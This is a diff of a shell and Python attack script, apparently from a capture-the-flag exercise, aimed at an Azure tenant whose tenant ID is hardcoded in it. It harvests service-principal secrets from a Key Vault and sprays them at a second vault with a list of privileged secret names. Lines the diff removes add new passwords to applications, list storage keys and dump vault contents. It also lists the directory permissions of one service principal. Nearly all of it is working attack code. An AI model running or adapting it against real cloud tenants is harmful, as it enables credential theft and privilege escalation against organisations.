@@ -7,14 +7,12 @@ VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oaut
 export VT
 python3 - <<'PY'
 import os,json,urllib.request,urllib.parse,re
-VT=os.environ["VT"];TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e";SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-def api(u,t,method="GET",data=None,ct="application/json"):
-    h={"Authorization":"Bearer "+t}
-    if data is not None:h["Content-Type"]=ct
-    try:return urllib.request.urlopen(urllib.request.Request(u,headers=h,method=method,data=data),timeout=25).read().decode()
+VT=os.environ["VT"];TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
+def api(u,t):
+    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t}),timeout=20).read().decode()
     except Exception as e:
-        try:return "ERR:"+e.read().decode()[:160]
-        except:return "ERR:"+str(e)
+        try:return f"E{e.code}:"+e.read().decode()[:80]
+        except:return "ERR"
 def tok(c,x,sc):
     d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
     try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
@@ -22,48 +20,39 @@ def tok(c,x,sc):
 def hit(tag,s):
     for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
 PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
-sps={}
+sps=[]
 for s in json.loads(api(PV+"/secrets?api-version=7.4",VT))["value"]:
     try:
-        j=json.loads(json.loads(api(s["id"]+"?api-version=7.4",VT))["value"]);sps[j["appId"]]=j["clientSecret"]
+        j=json.loads(json.loads(api(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
     except:pass
+NAMES=["flag","Flag","FLAG","df26","the-flag","ctf-flag","break-glass","breakglass","emergency","emergency-access","owner","admin","root","master","master-key","legacy-admin","legacy-admin-secret","legacy-admin-password","platform-automation","automation","arm-owner","armowner","escalation","bootstrap","seed","root-secret","final","kv-flag","secret","backup-admin","global-admin"]
+SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
+for name,cid,sec in sps:
+    vt=tok(cid,sec,"https://vault.azure.net/.default")
+    if not vt:continue
+    got=[]
+    for n in NAMES:
+        r=api(f"{SEC}/secrets/{n}?api-version=7.4",vt)
+        if r.startswith("E403"):continue
+        if r.startswith("E404"):got.append(n+"[404-but-access!]");continue
+        hit(f"{name}:{n}",r)
+        try:print(f"  [{name}] {n} =", json.loads(r).get("value","")[:300]);got.append(n+"=GOT")
+        except:print(f"  [{name}] {n} ->",r[:80]);got.append(n+"?")
+    if got:print(f"[{name}] notable:",got)
+# directory-audit quyền Graph thật
 DA="2c34300e-1bc0-41e7-9c1e-8b7571d72c72"
-gt=tok(DA,sps[DA],"https://graph.microsoft.com/.default")
-apps={}
-for a in json.loads(api("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=200",gt)).get("value",[]):
-    apps[a["displayName"]]=(a["id"],a["appId"])
-print("apps:",{k:v[1] for k,v in apps.items() if k.startswith("tbl")})
-TARGETS=["tbl-legacy-admin","tbl-platform-automation","tbl-cicd-deployer","tbl-directory-sync","tbl-reporting-insights"]
-def probe(appid,secret,label):
-    print(f"  == as {label} ({appid}) ==")
-    at=tok(appid,secret,"https://management.azure.com/.default")
-    if at:
-        subs=api(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at);hit("res",subs)
-        # listKeys mọi storage
-        for r in json.loads(subs).get("value",[]) if subs.startswith("{") else []:
-            if r.get("type")=="Microsoft.Storage/storageAccounts":
-                lk=api(f"https://management.azure.com{r['id']}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
-                print("   listKeys",r["name"],":","OK" if '"keys"' in lk else lk[:60])
-        print("   ARM subs resp:",subs[:80])
-    vt=tok(appid,secret,"https://vault.azure.net/.default")
-    if vt:
-        for V in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
-            r=api(f"https://{V}.vault.azure.net/secrets?api-version=7.4",vt);hit("vault "+V,r)
-            if '"value"' in r:
-                print(f"   {V} secrets:",[x['id'].rsplit('/',1)[-1] for x in json.loads(r)['value']])
-                for x in json.loads(r)["value"]:
-                    val=api(x["id"]+"?api-version=7.4",vt);hit(V+":"+x["id"].rsplit("/",1)[-1],val)
-                    print("     ",x["id"].rsplit("/",1)[-1],"=",json.loads(val).get("value","")[:200])
-            else:print(f"   {V}:",r[:80])
-for t in TARGETS:
-    if t not in apps:continue
-    oid,appid=apps[t]
-    body=json.dumps({"passwordCredential":{"displayName":"x"}}).encode()
-    r=api(f"https://graph.microsoft.com/v1.0/applications/{oid}/addPassword",gt,method="POST",data=body)
-    if '"secretText"' in r:
-        sec=json.loads(r)["secretText"];print(f"[+] addPassword {t} OK")
-        probe(appid,sec,t)
-    else:
-        print(f"[-] addPassword {t}:",r[:110])
+da=[x for x in sps if x[1]==DA]
+if da:
+    gt=tok(DA,da[0][2],"https://graph.microsoft.com/.default")
+    spid=json.loads(api(f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{DA}'&$select=id",gt))["value"][0]["id"]
+    G="https://graph.microsoft.com/v1.0/"
+    msg=json.loads(api(G+"servicePrincipals?$filter=appId eq '00000003-0000-0000-c000-000000000000'&$select=id,appRoles",gt))["value"][0]
+    rolemap={r["id"]:r["value"] for r in msg["appRoles"]}
+    asg=json.loads(api(G+f"servicePrincipals/{spid}/appRoleAssignments",gt)).get("value",[])
+    print("directory-audit Graph perms:",[rolemap.get(a["appRoleId"],a["appRoleId"]) for a in asg])
+    for rel in ["memberOf","transitiveMemberOf","ownedObjects"]:
+        d=api(G+f"servicePrincipals/{spid}/{rel}?$select=displayName,id",gt)
+        try:print(" ",rel,":",[o.get("displayName") for o in json.loads(d).get("value",[])])
+        except:pass
 print("== done ==")
 PY
